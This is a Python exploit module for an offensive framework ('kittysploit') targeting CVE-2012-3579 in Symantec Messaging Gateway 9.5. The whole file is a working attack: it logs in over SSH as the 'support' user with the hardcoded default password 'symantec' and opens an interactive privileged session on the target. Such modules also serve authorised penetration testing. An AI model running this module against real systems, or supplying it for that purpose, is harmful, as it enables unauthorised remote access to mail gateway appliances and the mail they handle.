from kittysploit import *
from lib.protocols.ssh.ssh_client import Ssh_client
from lib.exploit.handler import Handler

class Module(Exploit, Ssh_client, Handler):


	__info__ = {
			'name': 'Symantec Messaging Gateway 9.5 Default SSH Password',
			'description': "The 'support' user has a known default password, which can be used to login to the SSH service, and gain privileged access from remote",
			'cve': '2012-3579',
			'payload': {
				'default':'nopayload',
				}			
		}

	ssh_target = OptString("", "Target IPv4", "yes")
	ssh_port = OptPort(22, "Target SSH port", "yes")

	def run(self):
		client = self.open_ssh(user="support", password="symantec")
		connection = client.login()
		if connection:
			self.handler_ssh(connection)
		else:
			self.not_vulnerable()
